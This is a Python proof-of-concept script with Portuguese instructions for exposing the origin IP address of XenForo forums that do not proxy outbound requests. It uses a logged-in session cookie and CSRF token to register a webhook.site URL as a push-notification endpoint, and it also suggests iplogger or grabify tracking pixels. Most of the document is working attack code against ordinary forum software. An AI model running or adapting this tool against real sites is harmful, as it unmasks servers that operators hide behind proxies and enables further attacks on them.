"""
Obter o ip de servidores Xenforo que não usam proxy em conexões outbound.

Como reproduzir:
Modo 1
Simplesmente faça o upload de uma URL de imagem de pixel invisivel do iplogger.org ou grabify.

Modo 2
Cadastre seu servidor ou cloud function como um endpoint web push para receber
notificações.
No exemplo abaixo vamos usar um webhook gerado pelo site webhook.site.

Você vai precisar:
- Uma ou duas contas no forum alvo.
- A url do site
- O cookie de navegador "xf_user" para logar em uma conta de usuario cadastrado.
- A url de teste do site webhook.site

como fazer:
- Com suas credenciais e urls rode o script.
- Com outra conta envie uma mensagem privada para a conta com web push ativado ou espere algum alert.

"""
import re
import requests # dependência: requests

USER_AGENT = "Mozilla/5.0 (Linux; Linux i664 x86_64) Gecko/3214 Firefox/69.5"


class NotLoggedInError(Exception):
    """Raised when user is not logged"""
    pass


class RegexNotFoundError(Exception):
    """Raised when regex pattern not found in the HTML text"""
    pass


def regex_handler(pattern, html_text, group_idx=1):
    match = re.search(pattern, html_text, re.DOTALL)
    if match:
        return match.group(group_idx)
    raise RegexNotFoundError(f"{pattern} not found in the HTML text.")


class ForumScraper:
    def __init__(
            self,
            url: str,
            cookie: str,
            user_agent: str = USER_AGENT,
            cookie_name: str = "xf_user"
    ):
        self.payload = {}
        self.url = url.split('forums/')[0].rstrip("/")
        self.ses = requests.Session()
        self.ses.headers.update({"user-agent": user_agent})
        self.ses.cookies.update({cookie_name: cookie})

        self.get_authorization()

    def get_authorization(self):
        try:
            res = self.ses.get(f"{self.url}/help")
            res.raise_for_status()
            # print(res.text[0:1500])

            regex_handler(
                'data-logged-in="true"',
                res.text,
                group_idx=0,
            )
            self.payload["_xfToken"] = regex_handler(
                r'data-csrf="([^"]+)"',
                res.text
            )

        except (requests.RequestException, RegexNotFoundError) as e:
            raise NotLoggedInError(f"message: not logged in! Error: {str(e)}")


    def notify(self, endpoint: str):

        data = {
            "endpoint": endpoint,
            "key": "BPtZ7r5zbfThMQqfQsP3Naihf0LV2ncX6mvJlvkFSIg9Z3fSku/QOJs2ZhMH22jKNyWNYFXkQ/UeLPsfDWQaxXk=", # any random key
            "token": "wsa2Feb25HoCEtOrQihaBjQ==", # any random token
            "encoding": "aes128gcm",
            "unsubscribed": "0",
            "_xfResponseType": "json",
            "_xfToken": self.payload['_xfToken']
        }
        res = self.ses.post(f"{self.url}/index.php?misc/update-push-subscription", data=data)
        res.raise_for_status()

        print(res.text)



if __name__ == "__main__":
    url = "https://forum.some_forum.com"
    ck = "20%2DawTwasdwasdwasdwasdeasd"

    fs = ForumScraper(url, ck)

    e = "https://webhook.site/44b13e92-e6ea-4577-b98sb-262728763738"

    fs.notify(e)
